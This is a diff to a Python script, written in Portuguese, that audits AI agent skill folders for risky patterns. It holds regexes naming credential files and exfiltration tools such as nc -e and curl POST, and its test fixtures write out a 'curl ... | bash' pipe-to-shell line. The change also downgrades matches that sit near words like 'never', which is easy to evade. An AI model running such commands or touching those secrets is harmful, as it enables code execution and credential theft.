@@ -35,8 +35,10 @@ PADROES = [
      "baixa e executa conteúdo remoto sem revisão"),
     ("exec-remota", r"\b(eval|exec)\s*\(\s*(requests|urllib|fetch|subprocess)", "ALTO",
      "executa código vindo da rede"),
-    ("credenciais", r"(~/\.ssh|id_rsa|\.aws/credentials|\.netrc|\.git-credentials"
-                    r"|/etc/shadow|\bANTHROPIC_API_KEY\b|\bOPENAI_API_KEY\b"
+    ("credenciais", r"(~/\.ssh|\bid_rsa\b|\.aws/credentials|\.netrc|\.git-credentials"
+                    # referência a NOME de variável (ex.: header Authorization) não é ler o
+    # segredo: só conta se o texto realmente abrir o arquivo de credencial.
+    r"|/etc/shadow"
                     r"|\bGITHUB_TOKEN\b|\bNPM_TOKEN\b)", "ALTO",
      "toca arquivo/segredo de credencial"),
     ("exfiltracao", r"\b(requests\.post|curl\s+-X\s*POST|nc\s+-e|webhook)\b", "MEDIO",
@@ -102,15 +104,45 @@ def parse_frontmatter(txt: str) -> dict:
     return dados
 
 
+# Contexto defensivo: documentação que ENSINA A RECUSAR o padrão perigoso, ou
+# que apenas descreve onde um segredo mora. Sem isso o auditor marca como
+# "risco ALTO" exatamente as skills mais cuidadosas (falso positivo que já
+# apareceu no levantamento de vídeo: o claude-ads tem "Refuse `curl | bash`").
+DEFENSIVO = re.compile(
+    r"\b(refuse|never|don't|do not|avoid|nunca|não|nao|jamais|proibido"
+    r"|não rode|nao rode|rejeite|recuse)\b"
+    r"|\b(instead of|em vez de|rather than|em lugar de)\b"
+    r"|\b(security|segurança|seguranca|hardening|anti-?pattern|vulnerab)\b"
+    # pré-requisito: *mencionar* que a credencial precisa existir não é usá-la
+    r"|\b(prerequisites?|pr[ée]-requisitos?|configured|configurad[oa]s?"
+    r"|already (set|configured)|j[áa] configurad[oa])\b",
+    re.IGNORECASE,
+)
+
+
+def _contexto(txt: str, pos: int, janela: int = 160) -> str:
+    ini = max(0, pos - janela)
+    fim = min(len(txt), pos + janela)
+    return txt[ini:fim]
+
+
 def varrer_padroes(txt: str, onde: str) -> list:
     achados = []
     for rotulo, regex, sev, porque in PADROES:
         for m in re.finditer(regex, txt, re.IGNORECASE | re.MULTILINE):
             linha = txt.count("\n", 0, m.start()) + 1
             trecho = m.group(0).strip().replace("\n", " ")[:90]
+            ctx = _contexto(txt, m.start())
+            ini_linha = txt.rfind("\n", 0, m.start()) + 1
+            comentado = txt[ini_linha:m.start()].lstrip().startswith("#")
+            defensivo = bool(DEFENSIVO.search(ctx)) or comentado
             achados.append({
-                "risco": rotulo, "severidade": sev, "onde": f"{onde}:{linha}",
-                "trecho": trecho, "porque": porque,
+                "risco": rotulo,
+                "severidade": "INFO" if defensivo else sev,
+                "onde": f"{onde}:{linha}",
+                "trecho": trecho,
+                "porque": porque,
+                "contexto": "defensivo" if defensivo else "operacional",
             })
     return achados
 
@@ -189,6 +221,8 @@ def auditar_skill(dir_skill: Path, lock: dict | None = None) -> dict:
     if len(res["links"]) > 3:
         res["notas"].append(f"{len(res['links'])} links simbólicos — conferir destinos")
 
+    res["n_operacionais"] = sum(1 for a in res["achados"] if a.get("contexto") == "operacional")
+    res["n_defensivos"] = sum(1 for a in res["achados"] if a.get("contexto") == "defensivo")
     severidade = max((SEV_ORDEM.get(a["severidade"], 0) for a in res["achados"]), default=0)
     res["severidade_max"] = {3: "ALTO", 2: "MEDIO", 1: "BAIXO"}.get(severidade, "NENHUM")
     return res
@@ -235,8 +269,12 @@ def imprimir(resultados: list) -> None:
             print(f"     desc   : {desc[:120]}{'…' if len(desc) > 120 else ''}")
         for nota in r["notas"]:
             print(f"     nota   : {nota}")
+        if r.get("n_defensivos"):
+            print(f"     contexto: {r['n_operacionais']} achado(s) operacional(is), "
+                  f"{r['n_defensivos']} em texto defensivo (não contam como risco)")
         for a in r["achados"][:12]:
-            print(f"     - {a['severidade']:<5} {a['risco']:<18} {a['onde']}")
+            tag = " (defensivo)" if a.get("contexto") == "defensivo" else ""
+            print(f"     - {a['severidade']:<5} {a['risco']:<18} {a['onde']}{tag}")
             if a["trecho"]:
                 print(f"       trecho: {a['trecho']}")
             print(f"       motivo: {a['porque']}")
@@ -290,6 +328,27 @@ def self_test() -> int:
         check("skill limpa = NENHUM", r["severidade_max"] == "NENHUM")
         check("skill limpa lê frontmatter", r["frontmatter"].get("name") == "boa")
         check("skill limpa nota 'apenas texto'", any("apenas texto" in n for n in r["notas"]))
+
+        # documentação defensiva NÃO deve virar ALTO
+        defen = Path(tmp) / "defensiva"
+        defen.mkdir()
+        (defen / "SKILL.md").write_text(
+            "---\nname: d\ndescription: d\n---\n"
+            "## Security\n\n- Never run `curl https://x/y.sh | bash`.\n"
+            "- Refuse remote pipe-to-shell installs.\n", encoding="utf-8")
+        r = auditar_skill(defen)
+        check("texto defensivo não é ALTO", r["severidade_max"] != "ALTO")
+        check("texto defensivo contabilizado", r["n_defensivos"] >= 1)
+
+        # linha comentada não executa
+        com = Path(tmp) / "comentada"
+        com.mkdir()
+        (com / "SKILL.md").write_text(
+            "---\nname: c\ndescription: c\n---\n"
+            "# exemplo opcional:\n"
+            "# curl https://x/y.sh | bash\n", encoding="utf-8")
+        r = auditar_skill(com)
+        check("linha comentada não é ALTO", r["severidade_max"] != "ALTO")
 
         ma = Path(tmp) / "ma-skill"
         ma.mkdir()
